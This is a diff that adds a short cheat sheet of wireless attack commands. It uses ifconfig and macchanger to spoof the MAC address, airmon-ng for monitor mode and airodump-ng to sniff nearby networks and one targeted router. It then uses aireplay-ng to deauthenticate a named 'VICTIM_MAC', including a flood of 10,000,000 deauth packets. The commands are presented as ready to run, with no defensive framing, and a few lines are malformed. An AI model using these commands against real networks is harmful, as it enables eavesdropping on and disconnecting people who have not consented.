@@ -1,0 +1,46 @@
+#Change Mac Address
+ifconfig wlan0 down //or any other interface like eth0, lo, mon0 etc
+ifconfig hw ether 00:11:22:33:44:55 // any MAC address starting with 00
+/*
+*Mac address will reset on restart
+* or
+ip link
+sudo ip link set wlan0 down
+sudo macchanger -p wlan0
+sudo ip link set wlan0 up
+macchanger -s wlan0
+*/
+
+#Change Wireless Adapter Mode
+iwconfig //Inorder to check the current mode
+ifconfig wlan0 down
+airmon-ng check kill //For safety purpose to kill the processes
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+
+#Search the Network for different WIFI signals by Sniffing all the Packets
+{airodump-ng wlan0 //for 2.4 GHz signals
+airodump-ng --band a wlan0 //for 5 GHz signals
+airodump-ng --band abg wlan0 //for all ranges}
+
+
+#Targer Router for Sniffing
+airodump-ng --bssid MAC_ADDRESS_OF_ROUTER --channel ROUTER_CHANNEL --write ANY_FILE_NAME wlan0
+//After Sniffing open the FILE in wireshark for viewing the Packets
+
+#Deauthenticate the Specific System/ Disconnect it from the internet
+aireplay-ng --deauth 10000000 -a ROUTER_MAC -c VICTIM_MAC wlan0
+
+#Using airmon For The Above Stuff
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo aireplay-ng -9 wlan0mon
+sudo iw dev wlan0mon set channel <CH>
+sudo airodump-ng wlan0mon
+sudo aireplay-ng -0 20 -a <BSSID> wlan0mon
+dmesg | tail -n 50
+
+#Turn NetworkManager On again
+sudo systemctl status NetworkManager
+sudo systemctl start NetworkManager
+sudo systemctl enable NetworkManager
